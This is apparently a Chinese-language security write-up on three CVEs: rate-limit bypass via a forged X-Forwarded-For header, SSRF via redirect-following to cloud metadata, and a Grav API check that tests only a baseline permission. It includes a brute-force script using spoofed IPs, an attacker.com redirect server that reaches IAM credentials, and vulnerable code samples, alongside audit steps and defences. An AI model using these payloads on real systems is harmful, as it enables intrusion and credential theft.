🎯 概述

今天分析的三个CVE有一个共同主题：安全检查点的假设错误。每个漏洞都是因为开发者在安全检查中做了一个隐含假设，而攻击者精准击破了这个假设。

🔥 核心洞察：安全检查的有效性取决于其假设的正确性。假设代理头可信、假设重定向目标已检查、假设基线权限≠无权限——三个假设全部错误。

CVE 漏洞 CVSS 假设
CVE-2026-63770 X-Forwarded-For伪造 7.5 代理头=可信
CVE-2026-63764 SSRF重定向跟随 9.3 检查后的URL不变
CVE-2026-65007 基线权限检查无效 9.6 基线权限≠无权限

🔓 盲区一：代理头伪造绕过速率限制

漏洞原理

当应用部署在反向代理（Nginx/HAProxy/Cloudflare）后面时，客户端的真实IP从X-Forwarded-For头获取。Glance认证处理器在启用proxied选项后，直接用X-Forwarded-For替代socket IP作为速率限制的key。

问题在于：X-Forwarded-For是客户端可控的。攻击者只需在每个请求中换一个伪造的IP值，速率限制器就永远不触发。

# 漏洞逻辑
def get_client_ip(request):
    if config.proxied:
        return request.headers.get('X-Forwarded-For', request.remote_addr)
        #            ^^^^^^^^^^^^^^^^^^
        #            攻击者可任意伪造！
    return request.remote_addr

def check_rate_limit(ip):
    # 每个"IP"有10次/天的限制
    # 但攻击者每次请求换一个IP → 限制器永远不触发
    if attempts[ip] >= 10:
        return False  # 永远不会到这里
    return True

攻击过程

# 每次请求换一个伪造的X-Forwarded-For
curl -H "X-Forwarded-For: 1.2.3.4" http://target/login -d "pass=guess1"
curl -H "X-Forwarded-For: 5.6.7.8" http://target/login -d "pass=guess2"
curl -H "X-Forwarded-For: 9.10.11.12" http://target/login -d "pass=guess3"
# ... 无限尝试，100万次猜测1天内完成

# 自动化脚本
for i in $(seq 1 1000000); do
    ip="$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))"
    curl -s -H "X-Forwarded-For: $ip" \
        -d "username=admin&password=$(sed -n ${i}p wordlist.txt)" \
        http://target/login
done

🎯 这不是认证绕过——但它使暴力破解从不可能变为可能。原本100万次猜测需要100万天（10次/天限制），现在1天内可完成。

攻击面扩展

X-Forwarded-For不仅用于速率限制，还用于：

  • 地理封锁——伪造IP绕过地区限制
  • ACL白名单——伪造受信IP访问内网资源
  • 审计日志——伪造IP掩盖真实来源

🔓 盲区二：SSRF重定向安全断层

漏洞原理

当应用对用户提供的URL做HTTP请求时，通常会对初始URL进行安全检查（禁止内网IP等）。但如果HTTP客户端默认跟随重定向（allow_redirects=True），攻击者可以：

  1. 提供指向自己服务器的URL（通过安全检查）
  2. 自己的服务器返回302重定向到内网地址
  3. 目标服务器跟随重定向到http://169.254.169.254/latest/meta-data/
  4. 获取云IAM凭证
# lmdeploy 的漏洞路径
# OpenAI兼容API的image_url参数

import requests

# 安全检查（只检查初始URL）
def validate_url(url):
    parsed = urlparse(url)
    if parsed.hostname in ['127.0.0.1', '169.254.169.254', '10.*']:
        raise ValueError("Internal URL not allowed")
    return True  # ✅ 初始URL通过检查

# 实际请求（跟随重定向）
def fetch_image(url):
    validate_url(url)  # 检查通过
    resp = requests.get(url)  # ❌ 默认allow_redirects=True！
    return resp.content

攻击过程

# Step 1: 在攻击者服务器上设置302重定向
# attacker.com/redirect.py
from flask import Flask, redirect
app = Flask(__name__)

@app.route('/img.jpg')
def redir():
    return redirect('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
    #                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    #                 云元数据端点——安全检查从未检查这个URL

# Step 2: 向lmdeploy发起请求
curl http://target:23333/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "model",
    "messages": [{
      "role": "user",
      "content": [{"type": "image_url", "image_url": {"url": "http://attacker.com/img.jpg"}}]
    }]
  }'
# lmdeploy安全检查: attacker.com ✅ 通过
# requests.get("http://attacker.com/img.jpg") → 302 → 169.254.169.254 → 获取IAM凭证

🔥 关键洞察：安全检查点和实际请求点之间存在时间窗口——检查时URL是A，请求时URL变成B。这个窗口由HTTP重定向机制创造。

🔓 盲区三：权限检查最小公共分母

漏洞原理

Grav API插件在生成/吊销API Key时做权限检查——但检查的权限是admin.login（每个面板用户都有的基线权限），而不是admin.super或admin.api。

// Grav API插件的权限检查
public function onAdminApiAuthorization() {
    $user = $this->grav['user'];
    
    // ❌ 致命错误：admin.login 是基线权限
    if (!$user->authorize('admin.login')) {
        throw new \RuntimeException('Unauthorized');
    }
    // 此时 ANY logged-in user 都能通过！
    // editor、author、contributor...全部通过
    
    // 后续操作：为任意用户生成API Key
    $targetUser = $this->getPost()['username'];  // 可以是admin
    $apiKey = $this->generateApiKey($targetUser);
    // → 以admin身份调用API
}

权限检查有效性公式

检查有效性 = 检查权限 - 基线权限

admin.login 检查有效性 = admin.login - admin.login = 0  ← 形同虚设！
admin.super 检查有效性 = admin.super - admin.login > 0  ← 有效检查

🎯 核心洞察：开发者用「用户已登录」替代了「用户被授权」。admin.login只是证明用户在面板里，不能证明用户有权执行该操作。

攻击过程

# 用最低权限用户（editor）登录

🧠 统一攻击模型

「安全检查假设审计」框架

每个安全检查都包含隐含假设:

┌─────────────────────────────────────────────────┐
│ 安全检查          │ 隐含假设               │ 攻击者如何打破 │
├─────────────────────────────────────────────────┤
│ IP速率限制        │ IP头=可信来源           │ 伪造XFF       │
│ URL安全检查       │ 检查后URL不变           │ 302重定向     │
│ 权限检查          │ 检查权限=特权操作       │ 基线权限=无检查│
│ 输入过滤          │ 过滤后数据安全          │ 编码绕过      │
│ 签名验证          │ 验证后内容不变          │ 解析器差异    │
└─────────────────────────────────────────────────┘

审计时的核心问题不是「这个检查是否存在」，而是「这个检查的假设是否正确」。

🔎 审计方法

代理头伪造审计

# Step 1: 找到所有X-Forwarded-For的使用
grep -rn 'X-Forwarded-For\|X-Real-IP\|forwarded' --include='*.py' --include='*.js' --include='*.php' .

# Step 2: 检查trust proxy配置
grep -rn 'trust.proxy\|proxied\|TRUST_PROXY' .

# Step 3: 测试
# 正常请求
curl http://target/login -d "pass=wrong1" -v
# 伪造IP请求
curl -H "X-Forwarded-For: 1.2.3.4" http://target/login -d "pass=wrong2" -v
# 观察：速率限制是否基于XFF而非真实IP？

SSRF重定向审计

# Step 1: 找到所有requests.get/fetch调用
grep -rn 'requests\.get\|fetch(' --include='*.py' --include='*.js' .

# Step 2: 检查是否禁用重定向跟随
grep -rn 'allow_redirects.*False\|redirect.*manual' .

# Step 3: 测试
# 在attacker.com设置302到内网
curl -v http://target/api/fetch?url=http://attacker.com/test
# 观察：目标是否跟随重定向到内网？

基线权限审计

# Step 1: 找到所有权限检查
grep -rn 'authorize\|checkPermission\|has_perm\|Gate::allows' .

# Step 2: 对比检查权限 vs 所有角色默认权限
# 如果检查的权限是所有角色都有的 → 形同虚设

# Step 3: 用最低权限账户测试高权限操作
curl -X POST http://target/admin/api/sensitive-operation \
  -H "Authorization: Bearer "

🛡️ 防御建议

代理头伪造防御

  • 只信任最后一跳受信代理写入的X-Forwarded-For
  • 使用框架的trust proxy配置，但指定受信代理IP列表
  • 速率限制使用socket IP + XFF最后一跳的组合

SSRF重定向防御

  • 禁用自动重定向跟随：requests.get(url, allow_redirects=False)
  • 如果必须跟随重定向，对每个重定向目标递归执行安全检查
  • 使用DNS解析验证——解析hostname后检查IP是否为内网

权限检查防御

  • 权限检查使用操作级权限而非功能级权限
  • 检查权限必须严格高于基线权限
  • 建立权限矩阵文档，定期审查每个端点的检查权限是否合理

🎯 终极教训：安全检查的有效性 = 检查的假设是否正确。不要问「有没有检查」，要问「检查的假设是什么，攻击者能否打破这个假设」。
